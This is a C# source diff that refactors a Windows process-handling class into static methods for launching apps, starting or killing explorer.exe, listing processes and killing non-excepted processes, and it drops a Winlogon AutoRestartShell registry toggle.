@@ -10,11 +10,11 @@ using System.Security.Principal;
 using System.IO;
 using System.Runtime.InteropServices;
 
-namespace Drone
+namespace Drone.WinSystem
 {
-    class ProcessManager
+    static class ProcessHandler
     {
-        List<Process> SessionProcesses = new List<Process>();
+        static List<Process> SessionProcesses = new List<Process>();
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
         [DllImport("user32.dll")]
@@ -24,7 +24,7 @@ namespace Drone
 
         private static extern IntPtr GetShellWindow();
 
-        public string RunApp(string path, string commandline = null)
+        public static string RunApp(string path, string commandline = null)
         {
             if (path != "")
             {
@@ -57,40 +57,20 @@ namespace Drone
             }
         }
 
-        public void AdjustWinShell(bool adjust)
+        public static void RunWinShellProcess()
         {
-            bool isElevated;
-            WindowsIdentity identity = WindowsIdentity.GetCurrent();
-            WindowsPrincipal principal = new WindowsPrincipal(identity);
-            isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
-            if (isElevated)
-            {
-                RegistryKey ourKey = Registry.LocalMachine;
-                ourKey = ourKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
-                if (adjust)
-                {
-                    ourKey.SetValue("AutoRestartShell", 1);
-                    Process.Start(Path.Combine(Environment.GetEnvironmentVariable("windir"), "explorer.exe"));
-
-                }
-                else
-                {
-                    ourKey.SetValue("AutoRestartShell", 0);
-                    foreach (Process p in Process.GetProcessesByName("explorer"))
-                    {
-                        p.Kill();
-                        
-                    }
-
-                    
-                }
-                
-            }
-           
-               
+            Process.Start(Path.Combine(Environment.GetEnvironmentVariable("windir"), "explorer.exe"));
         }
 
-        public List<string> ViewProcesses()
+        public static void KillWinShellProcess()
+        {
+            foreach (Process p in Process.GetProcessesByName("explorer"))
+            {
+                p.Kill();
+            }
+        }
+
+        public static List<string> ViewProcesses()
         {
             List<string> ProcNames = new List<string>();
             foreach (Process p in Process.GetProcesses(System.Environment.MachineName))
@@ -100,7 +80,7 @@ namespace Drone
             return ProcNames;
         }
 
-        public void KillAllActive(string[] excepts)
+        public static void KillAllActive(string[] excepts)
         {
             foreach (Process p in Process.GetProcesses(System.Environment.MachineName))
             {
@@ -113,7 +93,7 @@ namespace Drone
           
         }
 
-        private bool NameExceptsList(string ProcName, string[] excepts)
+        private static bool NameExceptsList(string ProcName, string[] excepts)
         {
             foreach (string n in excepts)
             {
